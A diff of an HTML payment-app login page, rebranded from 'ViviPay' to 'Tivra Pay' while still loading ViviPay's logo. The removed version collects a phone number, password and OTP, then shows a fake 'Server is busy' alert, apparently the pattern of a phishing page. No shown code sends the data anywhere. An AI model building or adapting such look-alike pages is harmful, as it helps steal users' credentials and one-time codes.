@@ -3,72 +3,75 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>ViviPay</title>
+    <title>Tivra Pay</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
-        body { background: #fff; width: 100%; height: 100vh; display: flex; flex-direction: column; align-items: center; }
-        .logo { width: 105%; max-width: 500px; margin-top: 20px; }
-        .loginform { width: 90%; max-width: 380px; margin-top: 30px; }
-        .input-field-group { border-bottom: 1.2px solid #e2e8f0; padding: 14px 4px; margin-bottom: 22px; }
-        .input-field-group input { border: none; width: 100%; font-size: 17px; outline: none; }
-        .submit-btn { background-color: #2563eb; color: #fff; border: none; width: 100%; padding: 14px; border-radius: 25px; font-size: 18px; cursor: pointer; }
-        .form-utilities { display: flex; justify-content: space-between; margin-bottom: 20px; font-size: 14px; }
-        
-        /* Modal Styles */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; }
-        .modal.active { display: flex; }
-        .modal-content { background: #fff; padding: 20px; border-radius: 15px; width: 80%; text-align: center; }
-        .otp-input { width: 40px; height: 40px; text-align: center; font-size: 20px; margin: 5px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+        html, body { background-color: #ffffff; width: 100%; height: 100%; overflow-x: hidden; }
+        #app { width: 100%; height: 100%; }
+        main[data-v-6ffee151] { height: 100vh; width: 100%; display: flex; flex-direction: column; align-items: center; background-color: #ffffff; padding: 0 0.67rem; }
+        div[data-v-6ffee151]:not(.loginform) { width: 100%; display: flex; justify-content: center; align-items: center; margin-top: 1.2rem; margin-bottom: 0.5rem; }
+        img.logo { width: 105%; max-width: 500px; height: auto; object-fit: contain; align-items: center; }
+        .loginform { width: 100%; max-width: 380px; display: flex; flex-direction: column; }
+        .input-field-group { background-color: transparent; border-bottom: 1.2px solid #e2e8f0; display: flex; align-items: center; padding: 14px 4px; margin-bottom: 22px; width: 100%; }
+        .field-icon { display: flex; align-items: center; margin-right: 14px; }
+        .field-icon svg { width: 24px; height: 24px; stroke: #94a3b8; stroke-width: 1.5; fill: none; }
+        .input-field-group input { border: none; background: transparent; width: 100%; font-size: 17px; outline: none; color: #333333; }
+        .input-field-group input::placeholder { color: #cbd5e1; }
+        .form-utilities { display: flex; justify-content: space-between; align-items: center; font-size: 16px; margin-top: 4px; margin-bottom: 40px; width: 100%; padding: 0 4px; }
+        .remember-me { display: flex; align-items: center; color: #3b82f6; cursor: pointer; }
+        .remember-me input { appearance: none; -webkit-appearance: none; width: 18px; height: 18px; border: 1.5px solid #cbd5e1; border-radius: 50%; margin-right: 10px; outline: none; background-color: #ffffff; cursor: pointer; }
+        .remember-me input:checked { border-color: #3b82f6; background-color: #3b82f6; }
+        .forgot-pass-link { text-decoration: none; color: #3b82f6; cursor: pointer; }
+        .submit-btn { background-color: #2563eb; color: #ffffff; border: none; width: 100%; padding: 14px; border-radius: 25px; font-size: 18px; font-weight: 500; cursor: pointer; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2); transition: background 0.2s; }
+        .policy-container-box { margin-top: auto; margin-bottom: 25px; height: 3rem; display: flex; justify-content: center; align-items: center; width: 100%; }
+        .agreement-label { display: flex; align-items: center; font-size: 13px; color: #64748b; cursor: pointer; }
+        .agreement-label input { appearance: none; -webkit-appearance: none; width: 16px; height: 16px; border: 1px solid #2563eb; border-radius: 50%; margin-right: 8px; outline: none; background-color: #2563eb; position: relative; display: flex; align-items: center; justify-content: center; }
+        .agreement-label input::after { content: '✓'; position: absolute; color: white; font-size: 11px; font-weight: bold; }
+        .policy-link { color: #2563eb; text-decoration: none; margin-left: 3px; }
     </style>
 </head>
 <body>
 
-    <img src="https://vivipay.net/static/images/Login_Logo.png" class="logo">
-
-    <div class="loginform">
-        <form id="loginForm">
-            <div class="input-field-group"><input type="tel" id="phone" placeholder="Enter phone number" required></div>
-            <div class="input-field-group"><input type="password" id="pass" placeholder="Enter password" required></div>
-            <div class="form-utilities">
-                <label><input type="checkbox"> Save Password</label>
-                <span id="forgotBtn" style="color:#2563eb; cursor:pointer;">Forgot password</span>
+    <div id="app">
+        <main data-v-6ffee151>
+            <div>
+                <img src="https://vivipay.net/static/images/Login_Logo.png" class="logo" alt="Tivra Pay Logo">
             </div>
-            <button type="submit" class="submit-btn">Login</button>
-        </form>
+
+            <div class="loginform">
+                <form id="loginForm" style="width: 100%; display: flex; flex-direction: column;">
+                    <div class="input-field-group">
+                        <span class="field-icon">
+                            <svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
+                        </span>
+                        <input type="tel" id="phoneNumber" placeholder="Enter phone number" required>
+                    </div>
+
+                    <div class="input-field-group">
+                        <span class="field-icon">
+                            <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                        </span>
+                        <input type="password" id="password" placeholder="Enter password" required>
+                    </div>
+
+                    <div class="form-utilities">
+                        <label class="remember-me"><input type="checkbox" id="save-pwd"> Save Password</label>
+                        <span class="forgot-pass-link" id="triggerForgot">Forgot password</span>
+                    </div>
+
+                    <button type="submit" class="submit-btn">Login</button>
+                </form>
+            </div>
+
+            <div class="policy-container-box">
+                <label class="agreement-label">
+                    <input type="checkbox" id="agreeCheck" required checked> Agree <span class="policy-link">"User Privacy Agreement"</span>
+                </label>
+            </div>
+        </main>
     </div>
 
-    <!-- OTP Modal -->
-    <div id="otpModal" class="modal">
-        <div class="modal-content">
-            <h3>Enter OTP</h3>
-            <input type="tel" class="otp-input" maxlength="1">
-            <input type="tel" class="otp-input" maxlength="1">
-            <input type="tel" class="otp-input" maxlength="1">
-            <input type="tel" class="otp-input" maxlength="1">
-            <br><br>
-            <button class="submit-btn" onclick="submitOtp()">Submit OTP</button>
-        </div>
-    </div>
-
-    <script>
-        const BACKEND_URL = 'https://vivipay-backend.onrender.com'; // Apna backend URL yahan rakhein
-
-        // Login Submit
-        document.getElementById('loginForm').onsubmit = (e) => {
-            e.preventDefault();
-            document.getElementById('otpModal').classList.add('active');
-        };
-
-        // Forgot Password Click
-        document.getElementById('forgotBtn').onclick = () => {
-            alert("Redirecting to Forgot Password...");
-        };
-
-        // OTP Submit
-        function submitOtp() {
-            alert("Server is busy, please try again later.");
-            window.location.reload();
-        }
-    </script>
 </body>
 </html>
